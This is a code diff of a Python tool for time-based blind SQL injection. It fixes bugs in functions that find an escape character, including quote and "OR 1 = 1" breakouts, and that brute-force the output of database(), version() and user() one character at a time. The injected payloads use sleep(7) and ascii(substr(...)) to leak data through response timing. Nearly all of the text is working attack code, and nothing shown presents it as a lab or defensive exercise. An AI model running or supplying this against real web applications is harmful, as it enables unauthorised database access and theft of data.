@@ -38,7 +38,7 @@ def escape(url,param,list = ["'",'"',')','")',"')","' OR 1 = 1",'" OR 1 = 1',"\\
             elif option.lower() == 'n':
                 state = 0
 
-    return char
+    return char[0]
 
 #function to find the length of information
 def len_find(char,param,fun,url) :
@@ -54,23 +54,23 @@ def len_find(char,param,fun,url) :
 
 #Function to bruteforce information from the database
 def bruteforce(char,param,url):
-    functions = ['database()','version(),user()']
+    functions = ['database()','version()','user()']
     data = {} # dict to store the details
     for f in functions :
+        print("Finding length of "+f)
         length = len_find(char,param,f,url)
-        temp = '' # temporary var to stroe the data extracted
-        c = count(start = 32)
+        temp = '' # temporary var to store the data extracted
         for i in range(length):
+            iter = count(start = 32)
+            c = next(iter)
             while c < 127 :
-                payload = url + "?" + param + "=1"+char+ " AND if(((ascii(substr((select database()),"+i+",1))) = "+next(c)+"),sleep(7),null) --+"
+                payload = url + "?" + param + "=1"+char+ " AND if(((ascii(substr((select "+f+"),"+str(i+1)+",1))) = "+str(c)+"),sleep(7),null) --+"
                 t = time(payload)
                 if t > 7 :
-                    temp = temp + chr(next(c)-1)
-                else : next(c)
-        data[f] = temp
-
-        #?id=1' AND if(((ascii(substr((select database()),i,1))) = c),sleep(7),null) --+
-    print(payload)
-
-    #if (substr((select "+f+"),i,1)=\"security\", sleep(5),null); --+"
+                    temp = temp + chr(c)
+                    break
+                else : c = next(iter)
+        data[f]=temp
+    for f in functions:
+        print(f+": "+data[f])
 
